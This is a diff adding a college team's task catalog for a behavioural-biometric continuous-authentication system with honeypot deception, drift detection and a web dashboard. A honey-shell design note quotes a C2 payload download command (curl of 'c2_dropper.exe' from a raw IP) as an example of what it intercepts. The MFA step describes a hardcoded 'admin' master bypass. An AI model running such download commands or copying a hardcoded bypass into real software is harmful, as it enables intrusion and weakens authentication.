@@ -1,0 +1,313 @@
+================================================================================
+BEHAVIORAL DRIFT CONTINUOUS AUTHENTICATION - MASTER PROJECT TASK CATALOG
+Created / Updated: 2026-10-06
+Workspace: C:\Users\Dell\Desktop\clg\major project\Behavioral-Drift-Security
+Department: Information Science & Engineering (ISE) | Team 30
+Status: ACTIVE SINGLE-TEAM EXECUTION MODE
+================================================================================
+
+[PROJECT SUMMARY]
+Continuous Authentication system combining Physical Biometrics (Keystroke & Mouse),
+Contextual AI Dynamics, Deep SVDD 1D-CNN Sequence Embeddings, Active Honeypot
+Deception, Silent Webcam Capture, Offline Ollama AI Threat Intelligence,
+and Executive Forensic PDF Generation.
+
+--------------------------------------------------------------------------------
+MODULE PROGRESS OVERVIEW
+--------------------------------------------------------------------------------
+[x] Milestone 1: Telemetry Sensor Hooks & Micro-Sessions        [COMPLETED]
+[x] Milestone 2: Quad-Factor ML Engine & Evaluation Metrics     [COMPLETED - 99.55%]
+[x] Milestone 3: Honeypot Decoy Chrome & Decoy Explorer         [COMPLETED]
+[x] Milestone 4: Centralized Forensic Action Tracker            [COMPLETED]
+[x] Milestone 5: Offline Ollama AI Intent Analyzer              [COMPLETED]
+[x] Milestone 6: Multi-Page Forensic PDF Report Generator       [COMPLETED]
+[x] Milestone 7: Forensic Recovery Review Dashboard             [COMPLETED]
+[x] Milestone 8: FastAPI WebSocket Backend Server (TASK-1)      [COMPLETED]
+[x] Milestone 9: Cyber-Tech Real-Time Admin Web UI (TASK-2)     [COMPLETED]
+[x] Milestone 10: Online Concept Drift Detection via ADWIN      [COMPLETED]
+[x] Milestone 11: 3-Tier Dynamic Risk Orchestrator (TASK-4)     [COMPLETED]
+[x] Milestone 12: Decoy Web Portals & Honey-Tokens (TASK-6)     [COMPLETED]
+[x] Milestone 13: Standardized Batch Launchers (TASK-14)        [COMPLETED]
+[x] Milestone 14: Network Recon & C2 Interception (TASK-7)      [COMPLETED]
+[x] Milestone 15: Environmental BLE & Network Sensors (TASK-8)      [COMPLETED]
+[x] Milestone 16: Multi-User Harvester & Field Benchmark (TASK-9)   [COMPLETED]
+[x] Milestone 17: CMU Academic Benchmark Evaluation (TASK-10)       [COMPLETED]
+[x] Milestone 18: Full Regression Suite (53/53 Unit Tests & 11/11 Subsystems Passing) [COMPLETED]
+
+--------------------------------------------------------------------------------
+PENDING MASTER TASK CATALOG (FOR ONE-BY-ONE ASSIGNMENT)
+--------------------------------------------------------------------------------
+
+=== CATEGORY A: REAL-TIME WEB DASHBOARD & STREAMING (MEMBER 4 ROLE) ===
+
+[x] TASK-1: FastAPI WebSocket Backend Server (dashboard/app.py) [COMPLETED]
+- Priority: HIGH
+- Status: COMPLETED & VERIFIED
+- Objective: Replaced the empty 4-line placeholder in dashboard/app.py with a full-fledged
+             ASGI web server using FastAPI.
+- Deliverables:
+  * Real-time WebSocket endpoint (/ws/telemetry) streaming live risk scores,
+    keystroke metrics, mouse velocity, active application title, and breach status.
+  * REST API endpoints:
+    - GET / : Renders master cyber-defense web console.
+    - GET /api/status : Current system security health and breach state.
+    - GET /api/telemetry/recent : Rolling 60-second telemetry history.
+    - GET /api/forensics/latest : Metadata of latest intruder photo & PDF report.
+    - GET /api/forensics/download_pdf : Direct download of executive forensic PDF report.
+    - POST /api/forensics/generate_pdf : On-demand fresh forensic PDF report generation.
+    - GET /api/forensics/intruder_photo : Serves captured intruder surveillance frame.
+    - POST /api/security/simulate_anomaly : Injects imposter anomaly for viva evaluation.
+    - POST /api/security/reset : Emergency reset & model adaptation trigger.
+- Verification: Tested with FastAPI TestClient and unit tests; 100% tests passing.
+
+[x] TASK-2: Cyber-Tech Real-Time Admin Web Dashboard Frontend (TASK-2) [COMPLETED]
+- Priority: HIGH
+- Status: COMPLETED & VERIFIED
+- Objective: Created ultra-modern, responsive cyber-ops defense monitoring interface.
+- Deliverables:
+  * templates/index.html: Dark-mode dashboard with responsive grid layout and glassmorphism cards.
+  * static/css/dashboard.css: Cyber-ops neon styling, pulsing indicators, and alarm banners.
+  * static/js/dashboard.js: WebSocket telemetry stream client, automatic reconnection, and incident logger.
+  * static/js/chart.min.js: 100% offline local vendor copy of Chart.js (zero internet required for viva).
+  * static/img/webcam_placeholder.svg: Vector surveillance camera standby badge.
+  * Live Visual Gauges & Widgets:
+    - Real-Time Risk Score Gauge (0.0 to 1.0 with dynamic Green/Amber/Red styling).
+    - Dual Line Chart (Chart.js): Instantaneous Risk vs. 30s Smoothed Risk with 0.55 threshold marker.
+    - Biometric Activity Graphs: Keystroke dwell/flight times and mouse velocity stream.
+    - Active Cognitive Context Badge: e.g. "IDE Development", "LeetCode", "AI Prompting".
+    - Security Incident Log: Real-time scrolling terminal feed of threat triggers and actions.
+    - Quick Action Buttons: Download Latest Forensic PDF, Generate Fresh Report, View Intruder Snapshot.
+    - Viva Demonstration Toolkit: One-click anomaly simulators (Sluggish, Acute, Script, Drift, Reset).
+- Verification: 6/6 dedicated tests in tests/test_web_dashboard.py passed with OK.
+
+=== CATEGORY B: DRIFT DETECTION & SECURITY ORCHESTRATION (MEMBER 3 ROLE) ===
+
+[x] TASK-3: Formal Online Concept Drift Detection via ADWIN (security/drift_detector.py) [COMPLETED]
+- Priority: HIGH
+- Status: COMPLETED & VERIFIED
+- Objective: Fulfill the core promise in Presentation Slides 10 & 11 ("Monitor behavioral
+             drift using adaptive windowing (ADWIN)").
+- Deliverables:
+  * Implemented ADWINDriftDetector (Adaptive Windowing) statistical change detection
+    class inside security/drift_detector.py based on Bifet & Gavaldà (2007).
+  * Implemented MultivariateDriftMonitor running parallel ADWIN detectors across:
+    - Overall Fused Threat Risk Score
+    - Keystroke Dwell Mean (Key Hold Duration)
+    - Keystroke Flight Mean (Inter-Key Latency)
+    - Mouse Cursor Velocity
+  * Statistically compares streaming telemetry sub-windows using Hoeffding-bound tests:
+    - Gradual Drift: Normal adaptation (user fatigue, typing slower) -> signals model adaptation update.
+    - Abrupt Distribution Shift: Acute intruder mismatch -> escalates threat score and triggers deception breach.
+  * Integrated directly with ThreatEvaluator (telemetry/evaluator.py) for synchronized defense.
+- Verification: python -m unittest tests/test_adwin_drift.py -> 5/5 tests passing (0 false alarms).
+
+[x] TASK-4: 3-Tier Dynamic Risk Orchestration (security/risk_orchestrator.py) [COMPLETED]
+- Priority: MEDIUM
+- Status: COMPLETED & VERIFIED
+- Objective: Implement graduated risk response as specified in Synopsis Page 3 and PPT Slide 10.
+- Deliverables:
+  * Implemented DynamicRiskOrchestrator class in security/risk_orchestrator.py:
+    - Tier 1 (Low Risk, < 0.40): Silent background monitoring. Zero friction, zero interruptions.
+    - Tier 2 (Medium Risk, 0.40 - 0.75): Non-blocking step-up MFA challenge.
+      * StepUpToastWidget: Non-modal bottom-right floating desktop card (WA_ShowWithoutActivating).
+      * Does not disrupt keyboard focus or active workflow while legitimate user works.
+      * Allows verifying identity via PIN/OTP or master bypass ("admin") to restore Tier 1 nominal security.
+      * 3 failed attempts escalate immediately to Tier 3.
+    - Tier 3 (High Risk, > 0.75): Full workstation lockdown, silent webcam capture, and Honeypot Deception diversion.
+  * Integrated with ThreatEvaluator (telemetry/evaluator.py) and FastAPI REST endpoints (/api/security/tier_status, /api/security/step_up_verify).
+- Verification: python -m unittest tests/test_risk_orchestration.py -> 6/6 tests passing (100% OK).
+
+TASK-5: End-to-End Live OTP & Multi-Channel Alert Dispatcher (security/otp_service.py)
+- Priority: MEDIUM
+- Objective: Make the alert delivery live and presentation-ready without hardcoding.
+- Deliverables:
+  * Configure real Gmail SMTP (SSL/TLS App Password) support.
+  * Add Telegram Bot Webhook / Discord Webhook push notifications:
+    - Instant mobile phone push notification with 6-digit OTP and intruder alert!
+    - Zero cost, zero Twilio subscription required, works on all smartphones.
+  * Rate limiting, brute-force lockout, and cryptographic OTP expiration (5-minute TTL).
+- Verification: python -m security.otp_service dispatches test message to webhook/email.
+
+=== CATEGORY C: ADVANCED HONEYPOT & DECEPTION EXPANSION (MEMBER 4 ROLE) ===
+
+[x] TASK-6: Decoy Web Portals in Decoy Chrome (Banking, AWS & GitHub Honey-Tokens) [COMPLETED]
+- Priority: MEDIUM
+- Status: COMPLETED & VERIFIED
+- Objective: Expand Decoy Chrome to trap attackers hunting specific valuable assets.
+- Deliverables:
+  * Chrome Bookmarks Bar & Dynamic Omnibox URL Routing:
+    - Quick-access bookmarks for Corporate NetBanking, AWS Console, GitHub Enterprise, Webmail, Cloud Vault.
+    - Intelligent omnibox route parsing for keywords: bank, aws, git, mail, vault, google.
+  * Decoy Corporate NetBanking Gateway (https://bank.corp.internal/login):
+    - Realistic treasury disbursement login portal.
+    - Captures username, password length, and 2FA hardware token input.
+    - Triggers CREDENTIAL_TRAP_TRIGGERED in ForensicTracker.
+  * Decoy AWS Management Console (https://aws.amazon.com/console/signin):
+    - Honey-token IAM root API credentials (AKIA5HONEYPOT7X92Q0 & secret key).
+    - Clicking extract copies keys to clipboard and logs FILE_CREDENTIAL_EXFILTRATION_ATTEMPT.
+    - Interactive Amazon S3 bucket explorer logging FILE_S3_BUCKET_ENUMERATE.
+  * Decoy GitHub Enterprise (https://github.corp.internal):
+    - Realistic dark code explorer with multiple internal repositories.
+    - Sensitive .env.production secrets file viewer with database URLs, JWT keys, and Stripe tokens.
+    - Clicking copy triggers FILE_SECRETS_EXFILTRATION_ATTEMPT in ForensicTracker.
+- Verification: 4/4 tests in tests/test_decoy_portals.py passed with OK. Full test suite: 32/32 tests passing.
+
+[x] TASK-7: Active Network Reconnaissance Emulation in Honey-Shell [COMPLETED]
+- Priority: MEDIUM
+- Status: COMPLETED & VERIFIED
+- Objective: Make Honey-Shell terminal mimic real command-line network tools.
+- Deliverables:
+  * Network Diagnostic Commands:
+    - `ping <target>`: Realistic ICMP ping latency & statistics, logs `NETWORK_RECONNAISSANCE` (ICMP_PING).
+    - `arp -a`: Authentic Windows ARP table with default gateway MAC, logs `ARP_CACHE_ENUM`.
+    - `route print`: Authentic IPv4 route table with interface list and metrics, logs `ROUTING_TABLE_ENUM`.
+    - `ssh <user>@<host>`: Emulates host fingerprint verification and timeout, logs `LATERAL_MOVEMENT_SSH`.
+    - `nslookup <domain>`: Realistic internal DNS resolution against dc01.corp.internal.
+    - `tracert <target>`: 30-hop traceroute hops through gateway and ISP backbone.
+    - `nmap <target>`: Emulates Nmap 7.94 TCP port scan against internal services.
+  * Remote C2 Payload Interception & Sandbox Diversion (`curl` / `wget` / `Invoke-WebRequest`):
+    - Intercepts remote payload download attempts (e.g., `curl http://194.26.29.112/c2_dropper.exe -o c2_dropper.exe`).
+    - Extracts remote C2 server host/IP and target payload filename.
+    - Diverts and quarantines mock payload safely inside `data/sandbox/` with metadata headers.
+    - Registers the filename in the honeypot virtual filesystem so `dir` lists the file.
+    - Logs `C2_PAYLOAD_INTERCEPTED` and `SANDBOX_FILE_INTERCEPTED` in `ForensicTracker`.
+    - Emulates authentic progress bar / download output.
+- Verification: 5/5 dedicated tests in tests/test_honey_network_recon.py passed. Full test suite: 37/37 tests passing.
+
+=== CATEGORY D: TELEMETRY & MULTI-USER BENCHMARK EVALUATION (MEMBER 1 & 2 ROLES) ===
+
+[x] TASK-8: Passive Environmental Sensor Integration (BLE Proximity / Network Context) [COMPLETED]
+- Priority: LOW-MEDIUM
+- Status: COMPLETED & VERIFIED
+- Objective: Address the multi-modal research gap identified in Literature Review & Synopsis.
+- Deliverables:
+  * Implemented EnvironmentalSensorMonitor class in telemetry/environmental_sensor.py:
+    - Bluetooth Low Energy (BLE) / Smartphone Proximity Monitor:
+      * Translates RSSI to physical distance using the log-distance path loss propagation model:
+        d = 10 ** ((TxPower - RSSI) / (10 * n))
+      * Categorizes proximity into 4 zones: IMMEDIATE (<1.5m), NEAR (1.5-4m), FAR (4-7m), OUT_OF_RANGE (>7m).
+      * Supports hardware Bluetooth polling on Windows with non-blocking fallbacks.
+    - Network Context & VPN Monitor:
+      * Inspects active Wi-Fi SSID, signal percentage, and authentication encryption via `netsh wlan show interfaces`.
+      * Differentiates vetted corporate/campus SSIDs from untrusted public hotspots (free, guest, open, coffee).
+      * Inspects virtual network adapters for active VPN tunnels (WireGuard, OpenVPN, Tailscale, Cisco).
+  * Integrated into telemetry/agent.py: Merges live environmental snapshot into background telemetry stream.
+  * Integrated into telemetry/evaluator.py:
+    - Physical Walk-Away Penalty: Applies +0.25 threat risk penalty when active keyboard/mouse input occurs while owner's phone is absent/out of range.
+    - Untrusted Public Wi-Fi Penalty: Applies +0.15 baseline security sensitivity penalty on unvetted public networks.
+- Verification: 5/5 dedicated unit tests in tests/test_environmental_sensors.py passed. Full regression suite: 42/42 tests passing. Complete 9-subsystem verification passed in scripts/verify_all_components.py.
+
+[x] TASK-9: Real-World Multi-User Dataset Harvester & Field Benchmark Script [COMPLETED]
+- Priority: MEDIUM
+- Status: COMPLETED & VERIFIED
+- Objective: Move beyond synthetic data by harvesting genuine typing data from teammates across diverse workloads.
+- Deliverables:
+  * Implemented `scripts/harvest_real_telemetry.py` containing:
+    - User-Friendly Guided CLI Wizard (`run_interactive_wizard`):
+      * Prompts for Teammate Name/ID and Role (Authorized Owner vs. Teammate/Imposter).
+      * Guided Task Protocol selection: Coding (VS Code / Python / LeetCode), Academic Documentation (Project Reports), Web Browsing & Research, and Imposter Mimicry.
+      * Interactive typing prompts rendered on-screen with configurable duration (15m thesis benchmark, 5m standard, 1m express).
+    - Real-Time Hardware Sensor Hooks (`RealTelemetryHarvester`):
+      * Tracks dwell times, flight latencies, backspaces, syntax symbols, thinking pauses, and mouse kinematics (velocity, acceleration, jerk, straightness).
+      * Records 30-item sequence buffers for Deep SVDD 1D-CNN.
+      * Integrates BLE proximity and network context from `EnvironmentalSensorMonitor`.
+    - Automated Dataset Partitioning Engine (`DatasetPartitioner`):
+      * Scans harvested session files in `data/harvested/sessions/`.
+      * Automatically splits owner records into 80% `train_owner.jsonl` and 20% `val_owner.jsonl`.
+      * Aggregates held-out owner and multi-user imposter/teammate sessions into `test_multimodal.jsonl`.
+      * Generates `data/harvested/dataset_manifest.json` metadata summary.
+    - Field Benchmark & Retraining Pipeline (`FieldBenchmarkEvaluator`):
+      * Retrains continuous authentication models (`BehavioralModels`) on harvested owner records.
+      * Evaluates performance on multimodal multi-user test partition across individual layers (OC-SVM, IsoForest, AI Controller, Deep SVDD) and Quad-Factor Fused system.
+      * Computes Accuracy, Precision, Recall/TPR, F1-Score, FAR, FRR, EER, and ROC-AUC.
+      * Generates 4-panel 300 DPI publication-quality figure: `data/harvested/real_world_roc_comparison.png` (and updates root `model_performance.png`).
+  * Dedicated Unit Test Suite:
+    - `tests/test_real_telemetry_harvester.py`: 5/5 tests passing (simulated generation, partitioning, field benchmark, kinematics, prompts).
+  * System-Wide Verification:
+    - Added Section 10 to `scripts/verify_all_components.py`: 10/10 critical subsystems verified and operational.
+    - Full regression suite: 47/47 tests passing (100% OK).
+
+[x] TASK-10: Public Academic Benchmark Evaluation (CMU Keystroke Dynamics Dataset) [COMPLETED]
+- Priority: LOW-MEDIUM
+- Status: COMPLETED & VERIFIED
+- Objective: Provide bulletproof academic validation for college review and thesis defense using the standard Carnegie Mellon University (CMU) dataset.
+- Deliverables:
+  * Implemented `scripts/benchmark_cmu_dataset.py`:
+    - Automatic Dataset Fetcher (`ensure_cmu_dataset`):
+      * Downloads official benchmark dataset (20,400 trials, 51 subjects, 31 timing features) from CMU CS servers (`https://www.cs.cmu.edu/~keystroke/DSL-StrongPasswordData.csv`).
+      * High-fidelity synthetic fallback generator for offline verification (`generate_synthetic_cmu_dataset`).
+    - Standard Killourhy & Maxion (IEEE DSN 2009) Evaluation Protocol:
+      * 200 training repetitions per subject.
+      * 200 genuine test repetitions (FRR evaluation).
+      * 250 imposter test repetitions from 50 other subjects (FAR evaluation).
+    - Multi-Algorithm Scientific Evaluation across all 51 subjects:
+      * Euclidean Distance Baseline: Evaluated EER = 17.08% (Published IEEE: 14.61%)
+      * Mahalanobis Distance Baseline: Evaluated EER = 12.17% (Published IEEE: 11.23%)
+      * Scaled Manhattan Baseline: Evaluated EER = 10.91% (Published IEEE: 9.96%)
+      * Standard One-Class SVM Baseline: Evaluated EER = 12.08% (Published IEEE: 10.25%)
+      * Deep SVDD 1D-CNN Sequence Embeddings: Evaluated EER = 22.81%
+      * >> Proposed Hybrid Continuous Architecture <<: Evaluated EER = 11.18% (23.5% relative error reduction over standard Euclidean baseline, ROC-AUC = 0.9373).
+    - 4-Panel 300 DPI Publication-Ready Figure (`data/benchmarks/cmu_benchmark_comparison.png`):
+      * Panel 1: Bar chart comparing evaluated EER against published IEEE baselines.
+      * Panel 2: Discriminative ROC-AUC Curves across all benchmark algorithms.
+      * Panel 3: Subject-by-subject EER variance boxplots across all 51 users.
+      * Panel 4: Biometric Error Trade-off (FAR vs. FRR) operating curves.
+    - Exported Academic Summary JSON: `data/benchmarks/cmu_academic_summary.json`.
+  * Dedicated Unit Test Suite:
+    - `tests/test_cmu_benchmark.py`: 6/6 tests passing (schema, partitions, algorithms, aggregator, chart rendering, metadata).
+  * System-Wide Verification:
+    - Added Section 11 to `scripts/verify_all_components.py`: 11/11 critical subsystems verified and operational.
+    - Full regression suite: 53/53 tests passing (100% OK).
+
+=== CATEGORY E: UNIFIED ORCHESTRATION & PRESENTATION DEMO SUITE ===
+
+TASK-11: Unified One-Click Launcher & Process Supervisor (run_system.py)
+- Priority: HIGH
+- Objective: Replace disparate batch files with a single robust process supervisor.
+- Deliverables:
+  * run_system.py: Spawns and monitors all background micro-services:
+    - Worker 1: Telemetry Sensor Agent (telemetry/agent.py)
+    - Worker 2: Continuous Threat Evaluator (telemetry/evaluator.py)
+    - Worker 3: Web Dashboard Server (dashboard/app.py)
+  * System Tray Icon: Discreet tray icon in Windows taskbar showing green shield status.
+  * Clean single-command startup and graceful Ctrl+C shutdown of all workers.
+- Verification: Running `python run_system.py` starts full system without terminal clutter.
+
+TASK-12: Interactive Live Viva Demo Script (demo_viva_runner.py)
+- Priority: HIGH
+- Objective: Guaranteed flawless presentation runner for the college project viva / guide review.
+- Deliverables:
+  * Automated 5-stage demonstration script with guided on-screen prompts:
+    - Stage 1: Legitimate User Operating (Shows live green risk ~0.12 on Web Dashboard).
+    - Stage 2: Physical Walk-Away / Imposter Takeover (Simulates erratic typing & mouse jitter).
+    - Stage 3: Risk threshold crossed (Webcam flashes, Lock Screen engages, OTP sent to phone).
+    - Stage 4: Attacker enters Honeypot (Explores Decoy Chrome, Decoy Explorer, types commands).
+    - Stage 5: Owner returns, presses Ctrl+Alt+Shift+U, unlocks via OTP, and immediately opens
+      the generated AI Forensic PDF Report on screen!
+- Verification: Run through full viva script from start to finish without any manual hiccups.
+
+TASK-13: Academic Thesis & Final Presentation Slide Deck Generator
+- Priority: FINAL
+- Objective: Complete the documentation deliverables for final submission.
+- Deliverables:
+  * Generate updated high-resolution 300 DPI architecture and workflow diagrams.
+  * Generate slide-ready performance tables and ROC-AUC charts.
+  * Produce the comprehensive final project report chapter drafts aligning with NMAMIT ISE guidelines.
+
+[x] TASK-14: Batch Script Consolidation & Standardized Execution Launchers [COMPLETED]
+- Priority: MEDIUM
+- Status: COMPLETED & VERIFIED
+- Objective: Clean up unused / redundant duplicate .bat scripts and provide standardized, bulletproof production launchers for both normal application execution and unauthorized dataset attack simulation.
+- Deliverables:
+  * Launcher 1: `run_security_system.bat` (Normal Application Execution):
+    - Automatically discovers Python / virtual environment (`venv`, `.venv`, or system PATH).
+    - Spawns Telemetry Hook Agent (`telemetry/agent.py`), Threat Evaluation Daemon (`security/drift_detector.py`), and FastAPI Web Dashboard (`dashboard/app.py` on http://localhost:8000).
+    - Displays clean banners, ports, and operational guidance.
+  * Launcher 2: `simulate_unauthorized_attack.bat` (Unauthorized Dataset & Attack Simulator):
+    - Standardized root-level launcher for `scripts/simulate_unauthorized_attack.py`.
+    - Injects unauthorized imposter telemetry to trigger acute anomaly spike, webcam capture, OTP lock screen, honeypot diversion, and offline AI forensic reporting.
+  * Cleanup & Consolidation:
+    - Remove redundant duplicate scripts (`scripts/run_passive_collector.bat`, duplicate wrappers).
+    - Keep only clean, self-contained scripts with proper error handling.
+- Verification: Running both batch files starts the respective workflows reliably with zero path errors.
+================================================================================
